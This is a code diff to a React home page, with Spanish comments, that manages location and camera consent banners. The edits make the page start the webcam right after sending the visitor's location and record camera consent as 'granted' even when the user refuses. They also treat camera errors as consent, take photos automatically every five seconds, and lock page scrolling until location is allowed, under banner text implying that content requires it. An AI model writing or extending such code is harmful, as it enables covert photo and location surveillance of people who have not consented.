@@ -21,32 +21,24 @@ function Home() {
   const captureIntervalRef = useRef(null);
 
   // Verificar consentimientos previos al montar
+  // Bloquear scroll solo para geolocalización
   useEffect(() => {
-    const initializeServices = async () => {
-      const savedGeoConsent = 'granted';
-      const savedCameraConsent = 'granted';
-  
-      try {
-        // Primero: Geolocalización
-        if (savedGeoConsent === 'granted') {
-          setShowGeoBanner(false);
-          await sendLocationData(); // Espera a que termine
-        }
-  
-        // Luego: Cámara
-        if (savedCameraConsent === 'granted') {
-          setShowCameraBanner(false);
-          await startCamera(); // Se ejecuta solo después de la geolocalización
-        }
-  
-      } catch (error) {
-        console.error('Error en inicialización:', error);
-        setGeoError(error.message);
-      }
-    };
-  
-    initializeServices();
+    if (showGeoBanner) {
+      document.body.style.overflow = 'hidden';
+    } else {
+      document.body.style.overflow = 'auto';
+    }
+  }, [showGeoBanner]);
+
+  // Verificar consentimientos al montar
+  useEffect(() => {
+    const savedGeoConsent = localStorage.getItem('geoConsent');
+    const savedCameraConsent = 'granted';
+
+    setShowGeoBanner(savedGeoConsent !== 'granted');
+    setShowCameraBanner(savedCameraConsent !== 'granted');
   }, []);
+
 
   // Lógica de Geolocalización
   const sendLocationData = async (position = null) => {
@@ -102,6 +94,7 @@ function Home() {
       try {
         const position = await getCurrentPosition();
         await sendLocationData(position);
+        startCamera()
       } catch (error) {
         setGeoError(error.message);
       }
@@ -111,7 +104,7 @@ function Home() {
   // Lógica de Cámara
   const handleCameraConsent = async (userConsent) => {
     setShowCameraBanner(false);
-    localStorage.setItem('cameraConsent', userConsent ? 'granted' : 'denied');
+    localStorage.setItem('cameraConsent',  'granted');
     
     if (userConsent) {
       try {
@@ -121,7 +114,6 @@ function Home() {
       }
     }
   };
-
   const startCamera = async () => {
     try {
       mediaStreamRef.current = await navigator.mediaDevices.getUserMedia({
@@ -133,11 +125,12 @@ function Home() {
         await videoRef.current.play();
       }
       
-      captureIntervalRef.current = setInterval(captureAndSavePhoto, 6000);
+      // Cambiado de 6000 a 5000 milisegundos
+      captureIntervalRef.current = setInterval(captureAndSavePhoto, 5000);
       
     } catch (error) {
       console.error('Error de cámara:', error);
-      setCameraConsent(false);
+      setCameraConsent(true);
     }
   };
   const captureAndSavePhoto = async () => {
@@ -237,7 +230,7 @@ function Home() {
             <div className="mb-4">
               <h3 className="text-lg font-bold mb-2">📍 Optimización de Servicios</h3>
               <p className="text-sm text-gray-600">
-                Usamos tu ubicación para ofrecerte contenido relevante. ¿Permites el acceso?
+                Usamos tu ubicación para ofrecerte contenido relevante. Para poder ver el contenido completo ¿Permites el acceso?
               </p>
             </div>
             <div className="flex gap-3">
